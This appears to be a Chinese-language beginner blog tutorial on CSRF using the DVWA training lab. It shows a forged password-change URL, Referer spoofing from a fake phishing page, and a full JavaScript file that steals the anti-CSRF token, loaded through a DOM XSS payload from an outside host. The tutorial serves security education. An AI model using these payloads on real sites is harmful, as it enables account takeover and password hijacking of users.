> **原文链接**: https://mp.weixin.qq.com/s?__biz=MzU4MjYxNTYwNA==&mid=2247487755&idx=1&sn=69879fcde1e30553652dfd6060bc11cb

#  今日起，每周更新2+基础学习文章哦！今天是CSRF漏洞学习  
【白】  白安全组   2025-06-23 11:22  
  
**1**  
  
新手学习系列篇  
  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/1AUjJ6HpTUabooRtJPzULZ6HMWazXRWOibhvKUv7QAkyiaKuGX54kS8NFa8LiarGiawlaYNjGuXgdnpyJTu48aYSFg/640?wx_fmt=png&from=appmsg "")  
  
  
 从今天起我会持续更新新手学习系列教学，逐步完善对于新手入门学习与理解各种基础技术的应用与实战，初学者可以多关注哦！  
  
      
  
本章将针对DVWA靶场中的CSRF漏洞进行讲解，帮助大家快速从实战中理解什么是CSRF。  
  
靶场地址可以访问www.wangehacker.cn中找到社团资源，找到对应的靶场，也可自行本地搭建。（网上搜DVWA靶场搭建会有很多）  
  
  
任务一、基于DVWA的low级别实现CSRF攻击  
  
首先我们运行靶场来准备实验，难度级别调制low  
  
![](https://mmbiz.qpic.cn/mmbiz_png/1AUjJ6HpTUabooRtJPzULZ6HMWazXRWOOGN1ZNTLGiaXpEtNyg6fwf8vtXtcgF3SVOhSicnR0I6I4yyib3rr0UFbw/640?wx_fmt=png&from=appmsg "")  
  
然后选择csrf关卡  
  
![](https://mmbiz.qpic.cn/mmbiz_png/1AUjJ6HpTUabooRtJPzULZ6HMWazXRWO2VgYdOLc7MJBKJKSsBQDPG0bxyedcAOXk72YIe868mrpa9oZgsZricA/640?wx_fmt=png&from=appmsg "")  
  
提交一下数据我们使用burp来抓个包  
  
![](https://mmbiz.qpic.cn/mmbiz_png/1AUjJ6HpTUabooRtJPzULZ6HMWazXRWO28RU6ksHvvJkPqcj47OfPu0cLaBw9cFqGl7zJvhVHqPfIXopV1ibYYw/640?wx_fmt=png&from=appmsg "")  
  
这里是我们提交的数据  
  
GET /DVWA-master/vulnerabilities/csrf/?password_new=123456&password_conf=123456&Change=Change HTTP/1.1  
  
然后我们将中间提交的语句进行拼接，和url地址拼接  
  
http://192.168.0.107/DVWA-master/vulnerabilities/csrf/?password_new=123456&password_conf=123456&Change=Change  
  
我们访问这个地址就可以修改密码了  
  
![](https://mmbiz.qpic.cn/mmbiz_png/1AUjJ6HpTUabooRtJPzULZ6HMWazXRWOR2XK2Jv9OKoD3CcBdUphOibxe9Hp0MpFUVtPib8vTjhHMtic7jMg7BEjg/640?wx_fmt=png&from=appmsg "")  
  
任务二、基于DVWA的 Medium级别实现CSRF攻击  
  
我们先修改一下等级  
  
![](https://mmbiz.qpic.cn/mmbiz_png/1AUjJ6HpTUabooRtJPzULZ6HMWazXRWO4qI989m8NtMOPfDeXovl2Hsf7eMYQ0CyaVCuXxyzce8z8xUkWfcTlg/640?wx_fmt=png&from=appmsg "")  
  
然后我们还是回到csrf中进行实验  
  
分析这个安全等级的源码，会判断数据包referer是否一致  
  
这里我们先截取一下正常提交修改页面的Referer的值  
  
比如我们利用一个钓鱼网站发出的请求，我们就需要修改这个钓鱼网站的请求数据，也就是其中的referer后面的值  
  
我先在kali中简单构造一个页面来发出链接  
  
![](https://mmbiz.qpic.cn/mmbiz_png/1AUjJ6HpTUabooRtJPzULZ6HMWazXRWOebeNof7RCbyDMUy0ZGQGXIbZYXZAMDNtVUOFJDN888Cr2MIajzUKFw/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/1AUjJ6HpTUabooRtJPzULZ6HMWazXRWOtzRNrSDEWJz3npFVkzFCf3Jozvyiajdc2g8hSujxibzRDMvfgcBapoRQ/640?wx_fmt=png&from=appmsg "")  
  
这里我简单构造了一个  
  
点击这个链接就会发送任务一中的构造的修改密码的链接  
  
![](https://mmbiz.qpic.cn/mmbiz_png/1AUjJ6HpTUabooRtJPzULZ6HMWazXRWOteY84r7d0ehtQpndQRbkTdGhPx4XHwLfZS80VribdIDB1MibMueIXnibg/640?wx_fmt=png&from=appmsg "")  
  
但是这里因为换了安全等级，所以原先的方式已经无法修改密码了  
  
我们先登录原来的站点来抓取一下Referer头  
  
![](https://mmbiz.qpic.cn/mmbiz_png/1AUjJ6HpTUabooRtJPzULZ6HMWazXRWOK0bNVCfFc5Xsus5Yibz1cUHGvNuuibia024Vc2jcstncfWXcLJJOwDXqQ/640?wx_fmt=png&from=appmsg "")  
  
将这里的复制下来  
  
http://192.168.0.107/DVWA-master/vulnerabilities/csrf/  
  
然后将这个包丢弃掉  
  
![](https://mmbiz.qpic.cn/mmbiz_png/1AUjJ6HpTUabooRtJPzULZ6HMWazXRWOHmY6FO8GQCS7zYMvJLvdaKhRjO5j10edKqyYMo2uqJzDtRl36obicAQ/640?wx_fmt=png&from=appmsg "")  
  
我们回到我们的假冒站点中去  
  
提交的时候抓包截取  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/1AUjJ6HpTUabooRtJPzULZ6HMWazXRWOriby4jUVDB1wVU2jo2mArzTTc5pNm2AicykTWCFopeia7kNPTibHo3lWSg/640?wx_fmt=png&from=appmsg "")  
  
然后将我们之前拿到的原网站得到的Referer内容复制上去发送  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/1AUjJ6HpTUabooRtJPzULZ6HMWazXRWOlqVQZD4ua8TUArk8CTw5xeMzqE53GRL97ZBHqXq2PYUtQ6HmicdXH4g/640?wx_fmt=png&from=appmsg "")  
  
点击发送  
  
![](https://mmbiz.qpic.cn/mmbiz_png/1AUjJ6HpTUabooRtJPzULZ6HMWazXRWOu4rY3GEZAhKCx0AibAtERicUv7N9uueRtbr4AVl0qfPJFKFVJFWsF8gA/640?wx_fmt=png&from=appmsg "")  
  
这里直接修改成功了  
  
第二个方式就是我们修改一下目录结构来满足Referer的要求  
  
首先新建一个文件夹命名为原网站url地址，然后将文件放进去  
  
![](https://mmbiz.qpic.cn/mmbiz_png/1AUjJ6HpTUabooRtJPzULZ6HMWazXRWOSUFm31jy0fOeN8w9NvJx0A0Ov5o0MRh2xX2LuYVwr8zfKeEkmuWTBQ/640?wx_fmt=png&from=appmsg "")  
  
然后我们修改文件权限  
  
![](https://mmbiz.qpic.cn/mmbiz_png/1AUjJ6HpTUabooRtJPzULZ6HMWazXRWOeP50EdJN9RRRb7I6ydKpEVlxiavB0gvtKY9fK96sQl4FGZGvlWJiaicSw/640?wx_fmt=png&from=appmsg "")  
  
chown www-data:www-data 192.168.0.107 -R  
  
修改referer策略  
  
手工指定策略  
  
![](https://mmbiz.qpic.cn/mmbiz_png/1AUjJ6HpTUabooRtJPzULZ6HMWazXRWO5tT7ta184Gq6fkc4E7Nibc0icWic1qicfhF3fBwxHjfJddGibBqbujoCL6g/640?wx_fmt=png&from=appmsg "")  
  
<meta name="referrer" content="no-referrer-when-downgrade">  
  
  
修改完成，我们再打开假冒页面进行访问发送  
  
![](https://mmbiz.qpic.cn/mmbiz_png/1AUjJ6HpTUabooRtJPzULZ6HMWazXRWOhWDSxXSRfAV6Dia7wkbg31ZUmwAs1iau27cQ8iaE0UbRVdFaDmcv4Brcw/640?wx_fmt=png&from=appmsg "")  
  
抓包看一下  
  
![](https://mmbiz.qpic.cn/mmbiz_png/1AUjJ6HpTUabooRtJPzULZ6HMWazXRWOJxMW9nNSym2gMCnpwJR0eVGkFcevSzb83zwypfJfZAOGaoibyI4BibJg/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/1AUjJ6HpTUabooRtJPzULZ6HMWazXRWOCl9UmFMVgxPbbum6uP3rNV1ZUKhXYpUlAKM0NiccBUicDr3ic8Pl9Mmgw/640?wx_fmt=png&from=appmsg "")  
  
  
  
任务三、基于DVWA的High级别实现CSRF攻击  
  
首先修改安全级别  
  
![](https://mmbiz.qpic.cn/mmbiz_png/1AUjJ6HpTUabooRtJPzULZ6HMWazXRWOmmLhl0rzrWj97ErjJfwnHsA2Hx2r3nM9P2WaGOn9gDkG18jmd8E2vQ/640?wx_fmt=png&from=appmsg "")  
  
分析源码，这里要求我们提交时候有一个token的验证，这个验证无法绕过，只能通过xss的方式盗取  
  
我们先进行一个xss的漏洞利用  
  
![](https://mmbiz.qpic.cn/mmbiz_png/1AUjJ6HpTUabooRtJPzULZ6HMWazXRWOd5CDJkMpbkLHwT6xMSM9b7tsnE1PGicFvAUGeQwiayFUIeoniadeSf0BA/640?wx_fmt=png&from=appmsg "")  
  
这里可以看到设置了白名单，只能使用白名单中的字符  
  
  
思路就是使用#，#后的字符不会被发送到服务器，会在本地直接执行  
  
![](https://mmbiz.qpic.cn/mmbiz_png/1AUjJ6HpTUabooRtJPzULZ6HMWazXRWO5kUpyfLfIWhY5kDr69JvRV023gCGzA6iblEQY7T3GfjPlYibjc7BUKGA/640?wx_fmt=png&from=appmsg "")  
  
我们来构造一个js文件来进行csrf攻击  
  
![](https://mmbiz.qpic.cn/mmbiz_png/1AUjJ6HpTUabooRtJPzULZ6HMWazXRWOy93BxcibSMxNPNeJHicdRsCkpqxIcRdsLJZ451EJ4bScgDvVLF5sInNQ/640?wx_fmt=png&from=appmsg "")  
  
//弹出 cookie  
  
alert(document.cookie);  
  
//定义 AJAX 加载的页面  
  
var theUrl = 'http://192.168.1.63/DVWA-master/vulnerabilities/csrf/';  
  
//匹配浏览器  
  
if (window.XMLHttpRequest){  
  
// IE7+, Firefox, Chrome, Opera, Safari  
  
xmlhttp=new XMLHttpRequest();  
  
}else{  
  
// IE6, IE5  
  
xmlhttp=new ActiveXObject("Microsoft.XMLHTTP");  
  
}var count = 0;  
  
//页面加载完成后执行函数  
  
xmlhttp.onreadystatechange=function(){  
  
//判断请求已完成并且响应就绪状态码为 200 时执行代码  
  
if (xmlhttp.readyState==4 && xmlhttp.status==200)  
  
{//页面内容存储到 text 中进行匹配 token  
  
var text = xmlhttp.responseText;  
  
var regex = /user_token\' value\=\'(.*?)\' \/\>/;  
  
var match = text.match(regex);  
  
console.log(match);  
  
//弹出 token  
  
alert(match[1]);  
  
var token = match[1];  
  
//定义 payload url 并绑定 token 为我们从页面匹配到的 token 并且定义新的密码，新密码是  
  
admin  
  
var new_url = 'http://192.168.1.63/DVWAmaster/vulnerabilities/csrf/?user_token='+token+'&password_new=admin&pass  
  
word_conf=admin&Change=Change'  
  
//GET 方式提交一次 new_url  
  
if(count==0){  
  
count++;  
  
xmlhttp.open("GET",new_url,false);  
  
xmlhttp.send();  
  
} }  
  
};  
  
//GET 方式提交 theUrl  
  
xmlhttp.open("GET",theUrl,false);  
  
xmlhttp.send();  
  
  
然后构建payload  
  
192.168.0.107/DVWA-master/vulnerabilities/xss_d/?default=English#<script src="http://192.168.0.106/csrf.js"></script>  
  
![](https://mmbiz.qpic.cn/mmbiz_png/1AUjJ6HpTUabooRtJPzULZ6HMWazXRWOuqUjmsicAt17D7hwKz4AeBQZxwI2U5A9lee8tfDHxPoswJ3ljOLy1ibw/640?wx_fmt=png&from=appmsg "")  
  
  
任务四、使用CSRFTester进行自动化探测CSRF漏洞  
  
我们直接打开软件，需要一个Java环境  
  
![](https://mmbiz.qpic.cn/mmbiz_png/1AUjJ6HpTUabooRtJPzULZ6HMWazXRWOCiatM4rW7cG6juPcX6UXdDmX2VL44OAlA2IvZdz5KzEyBTtG15cRvMQ/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/1AUjJ6HpTUabooRtJPzULZ6HMWazXRWOGqsz8f82ZbISYY7InRoOBPUeKCKUUY7Zga48Vk5GZ84DRpvzrPhFlg/640?wx_fmt=png&from=appmsg "")  
  
设置一下浏览器代理  
  
![](https://mmbiz.qpic.cn/mmbiz_png/1AUjJ6HpTUabooRtJPzULZ6HMWazXRWOHVGeaQTZleY9A8VjuusAPyjOptmHyNoZicxEUSnygBDZfSHxm69oaIw/640?wx_fmt=png&from=appmsg "")  
  
然后使用，打开软件监听  
  
![](https://mmbiz.qpic.cn/mmbiz_png/1AUjJ6HpTUabooRtJPzULZ6HMWazXRWOj2ibIjHKCqiaO4e48QQCEFcicagia9HY5bC6a0F8xhSU5ke0q3KQKNpr1A/640?wx_fmt=png&from=appmsg "")  
  
然后我们对靶场进行操作，输入  
  
这时软件会记录  
  
![](https://mmbiz.qpic.cn/mmbiz_png/1AUjJ6HpTUabooRtJPzULZ6HMWazXRWOgqYHMgN4ic4QTLLZF9gTZUibBU1s3192pMiaFpPkIUHVNiacicqCnBbAMpA/640?wx_fmt=png&from=appmsg "")  
  
修改一下  
  
![](https://mmbiz.qpic.cn/mmbiz_png/1AUjJ6HpTUabooRtJPzULZ6HMWazXRWOe6iaxd8lgvXmarsjSpfhDmNdylIqpV5aN9bvvqzwJUjLaJibvoL4aic1Q/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/1AUjJ6HpTUabooRtJPzULZ6HMWazXRWOBYXmC6llppYBGlRVsMyco9JZsZGLBNsGWOgXov3lSic8uda4Weao8Zg/640?wx_fmt=png&from=appmsg "")  
  
生成html页面  
  
![](https://mmbiz.qpic.cn/mmbiz_png/1AUjJ6HpTUabooRtJPzULZ6HMWazXRWOHklS0mic9QUKlIgvU1O2eJr9FfbcwjK8a6d4I7zoxhREYH19oCF3S7g/640?wx_fmt=png&from=appmsg "")  
  
去掉勾，生成  
  
打开文件中的页面  
  
保留下面的我们提交的内容  
  
![](https://mmbiz.qpic.cn/mmbiz_png/1AUjJ6HpTUabooRtJPzULZ6HMWazXRWOAibnx9anYAKKqviaMMAwZVqV8yzynHnD4rEylSuWwOGP4brnfOM6gfbQ/640?wx_fmt=png&from=appmsg "")  
  
还有一些多余的删掉  
  
![](https://mmbiz.qpic.cn/mmbiz_png/1AUjJ6HpTUabooRtJPzULZ6HMWazXRWOumQyqCiaU9ibPXgVibKiczwib94GQshxmKoZP6wE4RJGJ9mmZxGaOmaFcoQ/640?wx_fmt=png&from=appmsg "")  
  
打开文件，然后访问到这个页面发现添加了成功  
  
可以判定没有csrf过滤  
  
  
